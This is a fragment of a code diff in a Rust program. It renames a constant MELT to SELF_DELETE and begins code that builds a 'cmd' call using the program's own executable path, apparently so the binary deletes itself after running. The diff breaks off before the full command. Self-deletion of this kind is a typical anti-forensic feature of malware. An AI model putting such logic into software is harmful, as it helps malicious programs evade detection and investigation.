@@ -250,7 +250,7 @@ fn main() {
         }
     }
 
-    if constants::MELT {
+    if constants::SELF_DELETE {
         if let Some(executable_path) = std::env::current_exe().unwrap().as_path().to_str() {
             let lp_file = CString::new("cmd").unwrap();
             let lp_parameters = CString::new(format!(
